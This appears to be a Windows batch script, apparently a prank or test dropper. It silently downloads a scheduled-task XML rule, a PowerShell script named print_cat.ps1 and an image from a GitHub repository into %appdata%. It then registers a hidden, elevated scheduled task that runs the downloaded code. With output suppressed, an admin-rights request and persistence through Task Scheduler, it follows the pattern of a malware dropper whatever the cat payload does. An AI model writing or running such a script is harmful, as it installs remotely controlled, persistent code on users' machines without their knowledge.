@echo off


set WORKDIR=%appdata%\Test

set TASK_OUT=%WORKDIR%\taskchd_rule.xml
set CAT_SCRIPT_OUT=%WORKDIR%\print_cat.ps1
set CAT_IMAGE_OUT=%WORKDIR%\cat.jpg
set TASK_NAME=ТЕСТ

set TASK_OUT_URI=https://raw.githubusercontent.com/vanos03/SmashingProject/refs/heads/main/taskchd_rule.xml
set CAT_SCRIPT_URI=https://raw.githubusercontent.com/vanos03/SmashingProject/refs/heads/main/print_cat.ps1
set CAT_IMAGE_URI=https://raw.githubusercontent.com/vanos03/SmashingProject/refs/heads/main/cat.jpg


mkdir "%WORKDIR%" > nul 2>&1

powershell -Command "Invoke-WebRequest -Uri "%TASK_OUT_URI%" -OutFile "%TASK_OUT%"" > nul 2>&1
powershell -Command "Invoke-WebRequest -Uri "%CAT_SCRIPT_URI%" -OutFile "%CAT_SCRIPT_OUT%"" > nul 2>&1
powershell -Command "Invoke-WebRequest -Uri "%CAT_IMAGE_URI%" -OutFile "%CAT_IMAGE_OUT%"" > nul 2>&1

powershell Start-Process schtasks -ArgumentList '/Create', '/XML', '%TASK_OUT%', '/TN', '%TASK_NAME%' -Verb RunAs -WindowStyle Hidden > nul 2>&1